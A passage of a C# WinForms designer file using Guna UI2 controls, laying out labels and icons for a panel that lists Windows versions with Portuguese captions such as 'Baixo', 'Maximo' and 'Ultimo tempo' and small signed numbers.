            this.guna2HtmlLabel24.Name = "guna2HtmlLabel24";
            this.guna2HtmlLabel24.Size = new System.Drawing.Size(101, 19);
            this.guna2HtmlLabel24.TabIndex = 147;
            this.guna2HtmlLabel24.Text = "Windows Server";
            // 
            // guna2PictureBox9
            // 
            this.guna2PictureBox9.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox9.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox9.Image")));
            this.guna2PictureBox9.ImageRotate = 0F;
            this.guna2PictureBox9.Location = new System.Drawing.Point(202, 430);
            this.guna2PictureBox9.Name = "guna2PictureBox9";
            this.guna2PictureBox9.Size = new System.Drawing.Size(20, 20);
            this.guna2PictureBox9.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox9.TabIndex = 150;
            this.guna2PictureBox9.TabStop = false;
            this.guna2PictureBox9.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel25
            // 
            this.guna2HtmlLabel25.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel25, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel25, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel25.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel25.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel25.Location = new System.Drawing.Point(54, 362);
            this.guna2HtmlLabel25.Name = "guna2HtmlLabel25";
            this.guna2HtmlLabel25.Size = new System.Drawing.Size(32, 15);
            this.guna2HtmlLabel25.TabIndex = 142;
            this.guna2HtmlLabel25.Text = "Baixo";
            // 
            // guna2HtmlLabel26
            // 
            this.guna2HtmlLabel26.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel26, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel26, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel26.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel26.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel26.Location = new System.Drawing.Point(232, 362);
            this.guna2HtmlLabel26.Name = "guna2HtmlLabel26";
            this.guna2HtmlLabel26.Size = new System.Drawing.Size(32, 15);
            this.guna2HtmlLabel26.TabIndex = 140;
            this.guna2HtmlLabel26.Text = "Baixo";
            // 
            // guna2PictureBox10
            // 
            this.guna2PictureBox10.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox10, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox10, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox10.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox10.Image")));
            this.guna2PictureBox10.ImageRotate = 0F;
            this.guna2PictureBox10.Location = new System.Drawing.Point(18, 287);
            this.guna2PictureBox10.Name = "guna2PictureBox10";
            this.guna2PictureBox10.Size = new System.Drawing.Size(25, 25);
            this.guna2PictureBox10.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox10.TabIndex = 128;
            this.guna2PictureBox10.TabStop = false;
            this.guna2PictureBox10.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel27
            // 
            this.guna2HtmlLabel27.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel27, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel27, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel27.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel27.ForeColor = System.Drawing.Color.Red;
            this.guna2HtmlLabel27.Location = new System.Drawing.Point(26, 360);
            this.guna2HtmlLabel27.Name = "guna2HtmlLabel27";
            this.guna2HtmlLabel27.Size = new System.Drawing.Size(17, 17);
            this.guna2HtmlLabel27.TabIndex = 141;
            this.guna2HtmlLabel27.Text = "+0";
            // 
            // guna2HtmlLabel28
            // 
            this.guna2HtmlLabel28.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel28, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel28, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel28.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel28.ForeColor = System.Drawing.Color.Red;
            this.guna2HtmlLabel28.Location = new System.Drawing.Point(205, 360);
            this.guna2HtmlLabel28.Name = "guna2HtmlLabel28";
            this.guna2HtmlLabel28.Size = new System.Drawing.Size(17, 17);
            this.guna2HtmlLabel28.TabIndex = 127;
            this.guna2HtmlLabel28.Text = "+3";
            // 
            // guna2PictureBox11
            // 
            this.guna2PictureBox11.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox11, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox11, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox11.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox11.Image")));
            this.guna2PictureBox11.ImageRotate = 0F;
            this.guna2PictureBox11.Location = new System.Drawing.Point(23, 322);
            this.guna2PictureBox11.Name = "guna2PictureBox11";
            this.guna2PictureBox11.Size = new System.Drawing.Size(20, 20);
            this.guna2PictureBox11.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox11.TabIndex = 132;
            this.guna2PictureBox11.TabStop = false;
            this.guna2PictureBox11.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel29
            // 
            this.guna2HtmlLabel29.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel29, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel29, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel29.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel29.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel29.Location = new System.Drawing.Point(231, 345);
            this.guna2HtmlLabel29.Name = "guna2HtmlLabel29";
            this.guna2HtmlLabel29.Size = new System.Drawing.Size(45, 15);
            this.guna2HtmlLabel29.TabIndex = 139;
            this.guna2HtmlLabel29.Text = "Maximo";
            // 
            // guna2HtmlLabel30
            // 
            this.guna2HtmlLabel30.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel30, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel30, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel30.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel30.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel30.Location = new System.Drawing.Point(49, 327);
            this.guna2HtmlLabel30.Name = "guna2HtmlLabel30";
            this.guna2HtmlLabel30.Size = new System.Drawing.Size(75, 15);
            this.guna2HtmlLabel30.TabIndex = 133;
            this.guna2HtmlLabel30.Text = "Ultimo tempo";
            // 
            // guna2HtmlLabel31
            // 
            this.guna2HtmlLabel31.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel31, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel31, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel31.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel31.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel31.Location = new System.Drawing.Point(49, 293);
            this.guna2HtmlLabel31.Name = "guna2HtmlLabel31";
            this.guna2HtmlLabel31.Size = new System.Drawing.Size(95, 19);
            this.guna2HtmlLabel31.TabIndex = 129;
            this.guna2HtmlLabel31.Text = "Windows 7 Pro";
            // 
            // guna2HtmlLabel32
            // 
            this.guna2HtmlLabel32.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel32, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel32, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel32.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel32.ForeColor = System.Drawing.Color.Green;
            this.guna2HtmlLabel32.Location = new System.Drawing.Point(202, 343);
            this.guna2HtmlLabel32.Name = "guna2HtmlLabel32";
            this.guna2HtmlLabel32.Size = new System.Drawing.Size(17, 17);
            this.guna2HtmlLabel32.TabIndex = 138;
            this.guna2HtmlLabel32.Text = "+9";
            // 
            // guna2HtmlLabel33
            // 
            this.guna2HtmlLabel33.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel33, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel33, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel33.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel33.ForeColor = System.Drawing.Color.Green;
            this.guna2HtmlLabel33.Location = new System.Drawing.Point(19, 343);
            this.guna2HtmlLabel33.Name = "guna2HtmlLabel33";
            this.guna2HtmlLabel33.Size = new System.Drawing.Size(24, 17);
            this.guna2HtmlLabel33.TabIndex = 136;
            this.guna2HtmlLabel33.Text = "+12";
            // 
            // guna2HtmlLabel34
            // 
            this.guna2HtmlLabel34.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel34, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel34, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel34.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel34.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel34.Location = new System.Drawing.Point(51, 345);
            this.guna2HtmlLabel34.Name = "guna2HtmlLabel34";
            this.guna2HtmlLabel34.Size = new System.Drawing.Size(45, 15);
            this.guna2HtmlLabel34.TabIndex = 137;
            this.guna2HtmlLabel34.Text = "Maximo";
            // 
            // guna2PictureBox12
            // 
            this.guna2PictureBox12.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox12, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox12, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox12.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox12.Image")));
            this.guna2PictureBox12.ImageRotate = 0F;
            this.guna2PictureBox12.Location = new System.Drawing.Point(202, 287);
            this.guna2PictureBox12.Name = "guna2PictureBox12";
            this.guna2PictureBox12.Size = new System.Drawing.Size(25, 25);
            this.guna2PictureBox12.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox12.TabIndex = 130;
            this.guna2PictureBox12.TabStop = false;
            this.guna2PictureBox12.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel35
            // 
            this.guna2HtmlLabel35.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel35, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel35, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel35.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel35.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel35.Location = new System.Drawing.Point(228, 327);
            this.guna2HtmlLabel35.Name = "guna2HtmlLabel35";
            this.guna2HtmlLabel35.Size = new System.Drawing.Size(75, 15);
            this.guna2HtmlLabel35.TabIndex = 135;
            this.guna2HtmlLabel35.Text = "Ultimo tempo";
            // 
            // guna2HtmlLabel36
            // 
            this.guna2HtmlLabel36.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel36, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel36, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel36.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel36.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel36.Location = new System.Drawing.Point(233, 293);
            this.guna2HtmlLabel36.Name = "guna2HtmlLabel36";
            this.guna2HtmlLabel36.Size = new System.Drawing.Size(96, 19);
            this.guna2HtmlLabel36.TabIndex = 131;
            this.guna2HtmlLabel36.Text = "Windows 7 SP3";
            // 
            // guna2PictureBox13
            // 
            this.guna2PictureBox13.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox13, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox13, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox13.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox13.Image")));
            this.guna2PictureBox13.ImageRotate = 0F;
            this.guna2PictureBox13.Location = new System.Drawing.Point(202, 322);
            this.guna2PictureBox13.Name = "guna2PictureBox13";
            this.guna2PictureBox13.Size = new System.Drawing.Size(20, 20);
            this.guna2PictureBox13.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox13.TabIndex = 134;
            this.guna2PictureBox13.TabStop = false;
            this.guna2PictureBox13.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel1
            // 
            this.guna2HtmlLabel1.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel1.Location = new System.Drawing.Point(54, 254);
            this.guna2HtmlLabel1.Name = "guna2HtmlLabel1";
            this.guna2HtmlLabel1.Size = new System.Drawing.Size(32, 15);
            this.guna2HtmlLabel1.TabIndex = 126;
            this.guna2HtmlLabel1.Text = "Baixo";
            // 
            // guna2HtmlLabel2
            // 
            this.guna2HtmlLabel2.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel2.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel2.Location = new System.Drawing.Point(232, 254);
            this.guna2HtmlLabel2.Name = "guna2HtmlLabel2";
            this.guna2HtmlLabel2.Size = new System.Drawing.Size(32, 15);
            this.guna2HtmlLabel2.TabIndex = 124;
            this.guna2HtmlLabel2.Text = "Baixo";
            // 
            // guna2PictureBox2
            // 
            this.guna2PictureBox2.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox2.Image")));
            this.guna2PictureBox2.ImageRotate = 0F;
            this.guna2PictureBox2.Location = new System.Drawing.Point(18, 179);
            this.guna2PictureBox2.Name = "guna2PictureBox2";
            this.guna2PictureBox2.Size = new System.Drawing.Size(25, 25);
            this.guna2PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox2.TabIndex = 112;
            this.guna2PictureBox2.TabStop = false;
            this.guna2PictureBox2.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel3
            // 
            this.guna2HtmlLabel3.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel3.ForeColor = System.Drawing.Color.Red;
            this.guna2HtmlLabel3.Location = new System.Drawing.Point(26, 252);
            this.guna2HtmlLabel3.Name = "guna2HtmlLabel3";
            this.guna2HtmlLabel3.Size = new System.Drawing.Size(17, 17);
            this.guna2HtmlLabel3.TabIndex = 125;
            this.guna2HtmlLabel3.Text = "+0";
            // 
            // guna2HtmlLabel4
            // 
            this.guna2HtmlLabel4.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel4.ForeColor = System.Drawing.Color.Red;
            this.guna2HtmlLabel4.Location = new System.Drawing.Point(205, 252);
            this.guna2HtmlLabel4.Name = "guna2HtmlLabel4";
            this.guna2HtmlLabel4.Size = new System.Drawing.Size(17, 17);
            this.guna2HtmlLabel4.TabIndex = 111;
            this.guna2HtmlLabel4.Text = "+3";
            // 
            // guna2PictureBox3
            // 
            this.guna2PictureBox3.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox3.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox3.Image")));
            this.guna2PictureBox3.ImageRotate = 0F;
            this.guna2PictureBox3.Location = new System.Drawing.Point(23, 214);
            this.guna2PictureBox3.Name = "guna2PictureBox3";
            this.guna2PictureBox3.Size = new System.Drawing.Size(20, 20);
            this.guna2PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox3.TabIndex = 116;
            this.guna2PictureBox3.TabStop = false;
            this.guna2PictureBox3.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel5
            // 
            this.guna2HtmlLabel5.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel5.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel5.Location = new System.Drawing.Point(231, 237);
            this.guna2HtmlLabel5.Name = "guna2HtmlLabel5";
            this.guna2HtmlLabel5.Size = new System.Drawing.Size(45, 15);
            this.guna2HtmlLabel5.TabIndex = 123;
            this.guna2HtmlLabel5.Text = "Maximo";
            // 
            // guna2HtmlLabel6
            // 
            this.guna2HtmlLabel6.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel6.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel6.Location = new System.Drawing.Point(49, 219);
            this.guna2HtmlLabel6.Name = "guna2HtmlLabel6";
            this.guna2HtmlLabel6.Size = new System.Drawing.Size(75, 15);
            this.guna2HtmlLabel6.TabIndex = 117;
            this.guna2HtmlLabel6.Text = "Ultimo tempo";
            // 
            // guna2HtmlLabel7
            // 
            this.guna2HtmlLabel7.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel7.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel7.Location = new System.Drawing.Point(49, 185);
            this.guna2HtmlLabel7.Name = "guna2HtmlLabel7";
            this.guna2HtmlLabel7.Size = new System.Drawing.Size(78, 19);
            this.guna2HtmlLabel7.TabIndex = 113;
            this.guna2HtmlLabel7.Text = "Windows 8.1";
            // 
            // guna2HtmlLabel8
            // 
            this.guna2HtmlLabel8.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel8.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel8.ForeColor = System.Drawing.Color.Green;
            this.guna2HtmlLabel8.Location = new System.Drawing.Point(202, 235);
            this.guna2HtmlLabel8.Name = "guna2HtmlLabel8";
            this.guna2HtmlLabel8.Size = new System.Drawing.Size(17, 17);
            this.guna2HtmlLabel8.TabIndex = 122;
            this.guna2HtmlLabel8.Text = "+9";
            // 
            // guna2HtmlLabel9
            // 
            this.guna2HtmlLabel9.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel9.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel9.ForeColor = System.Drawing.Color.Green;
            this.guna2HtmlLabel9.Location = new System.Drawing.Point(19, 235);
            this.guna2HtmlLabel9.Name = "guna2HtmlLabel9";
            this.guna2HtmlLabel9.Size = new System.Drawing.Size(24, 17);
            this.guna2HtmlLabel9.TabIndex = 120;
            this.guna2HtmlLabel9.Text = "+12";
            // 
            // guna2HtmlLabel10
            // 
            this.guna2HtmlLabel10.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel10, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel10, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel10.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel10.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel10.Location = new System.Drawing.Point(51, 237);
            this.guna2HtmlLabel10.Name = "guna2HtmlLabel10";
            this.guna2HtmlLabel10.Size = new System.Drawing.Size(45, 15);
            this.guna2HtmlLabel10.TabIndex = 121;
            this.guna2HtmlLabel10.Text = "Maximo";
            // 
            // guna2PictureBox4
            // 
            this.guna2PictureBox4.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox4.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox4.Image")));
            this.guna2PictureBox4.ImageRotate = 0F;
            this.guna2PictureBox4.Location = new System.Drawing.Point(202, 179);
            this.guna2PictureBox4.Name = "guna2PictureBox4";
            this.guna2PictureBox4.Size = new System.Drawing.Size(25, 25);
            this.guna2PictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox4.TabIndex = 114;
            this.guna2PictureBox4.TabStop = false;
            this.guna2PictureBox4.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel11
            // 
            this.guna2HtmlLabel11.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel11, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel11, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel11.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel11.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel11.Location = new System.Drawing.Point(228, 219);
            this.guna2HtmlLabel11.Name = "guna2HtmlLabel11";
            this.guna2HtmlLabel11.Size = new System.Drawing.Size(75, 15);
            this.guna2HtmlLabel11.TabIndex = 119;
            this.guna2HtmlLabel11.Text = "Ultimo tempo";
            // 
            // guna2HtmlLabel12
            // 
            this.guna2HtmlLabel12.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel12, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel12, Guna.UI2.AnimatorNS.DecorationType.None);
